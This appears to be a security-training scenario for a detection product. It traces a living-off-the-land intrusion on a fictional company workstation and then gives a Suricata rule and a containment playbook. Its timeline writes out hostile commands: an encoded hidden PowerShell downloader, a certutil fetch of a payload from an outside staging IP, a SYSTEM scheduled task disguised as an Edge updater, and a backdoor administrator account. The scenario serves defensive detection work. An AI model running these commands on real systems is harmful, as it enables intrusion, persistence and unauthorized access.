# Scenario 04: Living off the Land (LotL) Execution (SCN-004)

---

## 1. Scenario Overview

| Attribute | Specification |
|:---|:---|
| **Scenario ID** | SCN-004 |
| **Scenario Name** | Living off the Land (LotL) Execution & Defense Evasion |
| **Severity Level** | **Critical** |
| **Target Enterprise** | Bharat Electronics Components Pvt. Ltd. (BECPL), Pune |
| **Compromised Host** | `CORP-WS-003` (IP: `10.10.10.22` / Admin Workstation) |
| **Key Binaries Abused (LOLBins)** | `powershell.exe`, `certutil.exe`, `schtasks.exe`, `net.exe` |
| **External Staging Server** | `45.142.214.88:80` (`hxxp://45.142.214.88/stage2/msedge_update.bin`) |
| **Simulation Duration** | 20 minutes |
| **Observables Generated** | Sysmon Event IDs 1, 3, 12, 13; Zeek `http.log`, `conn.log` |
| **OT Safety Criticality** | **Low** (Isolated to corporate administrative endpoint) |

---

## 2. Threat Actor Context & Modus Operandi

"Living off the Land" (LotL) tactics represent a premier technique utilized by advanced adversaries and modern ransomware operators (e.g., Volt Typhoon, LockBit 3.0 affiliates). By executing built-in administrative binaries already signed by Microsoft Corporation (`certutil`, `powershell`, `schtasks`), the threat actor blends in with legitimate system operations, evading standard signature-based antivirus solutions.

In this scenario targeting BECPL, the adversary achieves initial code execution on administrative workstation `CORP-WS-003` via a macro-enabled procurement RFP document. The adversary then relies strictly on LOLBins to establish persistence and download second-stage implants.

```
       [Phishing Document Executed]
                    │
                    ▼
   powershell.exe -Enc <Base64_Payload>
                    │
                    ▼
     certutil.exe -urlcache -split -f ────► HTTP GET /stage2/msedge_update.bin
                    │                       (Outbound to 45.142.214.88)
                    ▼
       schtasks.exe /create /tn ...
                    │
                    ▼
      net.exe user /add sys_svc_bkp ...
```

---

## 3. High-Fidelity Observable Timeline

| Relative Time | System Component | Event / Channel | Command-Line / Network Details | Classification |
|:---:|:---|:---|:---|:---:|
| 00:00 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Parent:** `WINWORD.EXE` (PID: 4120)<br>**Child:** `powershell.exe` (PID: 6784)<br>**CommandLine:** `powershell.exe -nop -w hidden -ep bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...` | Malicious |
| 02:15 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Child:** `certutil.exe` (PID: 7120)<br>**CommandLine:** `certutil.exe -urlcache -split -f "http://45.142.214.88/stage2/msedge_update.bin" C:\ProgramData\msedge_update.dll` | Malicious |
| 02:16 | Perimeter Sensor | Zeek `http.log` | **Source:** `10.10.10.22:49814`<br>**Dest:** `45.142.214.88:80`<br>**URI:** `/stage2/msedge_update.bin`<br>**Method:** `GET`<br>**User-Agent:** `CertUtil URL Agent` | Malicious |
| 02:17 | CORP-WS-003 | Sysmon Event ID 3 (Network Conn) | **Process:** `C:\Windows\System32\certutil.exe`<br>**Dest:** `45.142.214.88:80`<br>**Protocol:** `TCP` | Malicious |
| 05:30 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Child:** `certutil.exe` (PID: 7304)<br>**CommandLine:** `certutil.exe -decode C:\ProgramData\msedge_update.dll C:\ProgramData\msedge_update.exe` | Malicious |
| 08:45 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Child:** `schtasks.exe` (PID: 7892)<br>**CommandLine:** `schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "C:\ProgramData\msedge_update.exe" /sc minute /mo 30 /ru "SYSTEM"` | Malicious |
| 08:46 | CORP-WS-003 | Sysmon Event ID 12/13 (Registry Object) | **TargetObject:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\...`<br>**EventType:** `CreateKey` / `SetValueKey` | Malicious |
| 12:00 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Child:** `net.exe` (PID: 8104)<br>**CommandLine:** `net user sys_svc_bkp P@ssw0rd2026! /add /expires:never` | Malicious |
| 12:02 | CORP-WS-003 | Sysmon Event ID 1 (Process Create) | **Child:** `net.exe` (PID: 8112)<br>**CommandLine:** `net localgroup administrators sys_svc_bkp /add` | Malicious |
| 12:15 | Security SIEM | VaultX Correlator | Correlated Alert: SCN-004 LotL Attack Chain. Severity: CRITICAL. | Alert |

---

## 4. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Artifact / Sub-Technique Context |
|:---|:---|:---|:---|
| **Execution** | `T1059.001` | Command & Scripting Interpreter: PowerShell | Hidden window, bypass execution policy, base64 encoded payload string. |
| **Defense Evasion** | `T1140` | Deobfuscate / Decode Files or Information | Abusing `certutil.exe -decode` to assemble payload on disk. |
| **Command & Control** | `T1105` | Ingress Tool Transfer | Abusing `certutil.exe -urlcache` as an unauthorized HTTP download tool. |
| **Persistence** | `T1053.005` | Scheduled Task/Job: Scheduled Task | Masquerading task name (`MicrosoftEdgeUpdateTaskMachineUA`) scheduled under `NT AUTHORITY\SYSTEM`. |
| **Persistence / Privilege Escalation** | `T1136.001` | Create Account: Local Account | Creating backdoor administrator user `sys_svc_bkp`. |

---

## 5. Detection Signatures & Zeek/Suricata Indicators

### 5.1 Suricata Rule Definition
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"VAULTX - Suspicious CertUtil External HTTP Download";
    flow:established,to_server;
    content:"CertUtil URL Agent"; http_user_agent;
    classtype:bad-unknown;
    sid:2900004;
    rev:1;
)
```

### 5.2 VaultX Host-Network Fusion Logic
- **Fusion Signal:** A Zeek `http.log` record originating from an internal host with `user_agent == "CertUtil URL Agent"` is immediately cross-correlated with Sysmon Event ID 1 on `10.10.10.22`.
- When parent process is spawned from an office suite or temporary folder, the threat score is elevated to 100/100.

---

## 6. Containment & Remediation Playbook

1. **Immediate Host Quarantine:**
   - Execute FortiGate quarantine API call for `10.10.10.22`.
2. **Process Termination & Task Removal:**
   - Issue agent instruction to kill process `msedge_update.exe` and delete task `MicrosoftEdgeUpdateTaskMachineUA`.
3. **Account Deletion:**
   - Delete rogue local account `sys_svc_bkp` via PowerShell administrative hook.
4. **Proxy Egress Block:**
   - Add external IP `45.142.214.88` to perimeter firewall blacklist.
